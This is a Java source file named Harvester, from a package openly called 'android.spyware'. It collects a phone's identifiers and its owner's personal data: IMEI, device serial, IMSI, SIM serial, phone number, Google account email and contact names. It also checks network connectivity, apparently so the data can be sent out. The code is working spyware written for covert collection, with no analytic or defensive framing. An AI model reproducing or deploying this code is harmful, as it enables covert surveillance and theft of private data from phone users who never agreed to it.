package android.spyware;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This class contains all the methods to harvest the Android device and associated user
 * account information.
 */
public class Harvester {
    private Context context;

    public Harvester(Context context) {
        this.context = context;
    }

    public Map<String, String> getDevice() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  Harvester.getDeviceId(): READ_PHONE_STATE permission not granted.");
                return null;
            }
        }

        Map<String, String> device = new HashMap<>();
        TelephonyManager mTelephonyMgr = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);

        device.put("IMEI", mTelephonyMgr.getDeviceId());
        device.put("deviceSerialNo", Build.SERIAL);
        device.put("manufacturer", Build.MANUFACTURER);
        device.put("model", Build.MODEL);
        device.put("android", Build.VERSION.RELEASE);

        return device;
    }

    public Map<String, String> getSim() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  Harvester.getSim(): READ_PHONE_STATE permission not granted.");
                return null;
            }
        }

        Map<String, String> sim = new HashMap<>();
        TelephonyManager mTelephonyMgr = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);

        sim.put("IMSI", mTelephonyMgr.getSubscriberId());
        sim.put("MCC_MNC", mTelephonyMgr.getSimOperator());
        sim.put("simSerialNo", mTelephonyMgr.getSimSerialNumber());
        sim.put("simNo", mTelephonyMgr.getLine1Number());

        return sim;
    }

    public String getEmail() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  Harvester.getEmail(): GET_ACCOUNTS permission not granted.");
                return null;
            }
        }

        AccountManager accountManager = AccountManager.get(context);
        Account[] accounts = accountManager.getAccountsByType("com.google");

        return accounts[0].name;
    }

    public String getContactName(String phoneNo) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  Harvester.getContactName(): READ_CONTACTS permission not granted.");
                return null;
            }
        }

        Uri URI = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNo));
        String[] COLUMNS = new String[]{
                ContactsContract.PhoneLookup.DISPLAY_NAME
        };

        Cursor cursor = context.getContentResolver().query(
                URI,
                COLUMNS,
                null,
                null,
                null);

        String contactName = null;

        if (cursor != null && cursor.getCount() > 0) {
            cursor.moveToFirst();
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            cursor.close();
        }

        return contactName;
    }

    public boolean isNetworkConnected() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED ||
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  Harvester.isNetworkConnected(): ACCESS_NETWORK_STATE, INTERNET permissions not granted.");
                return false;
            }
        }

        ConnectivityManager cm = (ConnectivityManager)
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();

        return (netInfo != null && netInfo.isConnectedOrConnecting());
    }
}
